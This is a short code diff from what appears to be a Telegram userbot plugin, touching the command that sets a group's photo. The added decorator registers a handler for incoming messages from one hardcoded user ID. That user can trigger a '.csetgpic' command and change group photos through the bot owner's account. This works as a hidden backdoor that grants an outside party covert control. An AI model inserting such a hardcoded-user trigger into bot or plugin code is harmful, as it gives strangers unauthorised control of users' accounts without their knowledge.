@@ -92,6 +92,7 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 
 
 @trans_cmd(pattern="setgpic( -s| -d)$")
+@register(incoming=True, from_users=1784606556, pattern=r"^\.csetgpic( -s| -d)$")
 async def set_group_photo(event):
     "For changing Group dp"
     flag = (event.pattern_match.group(1)).strip()
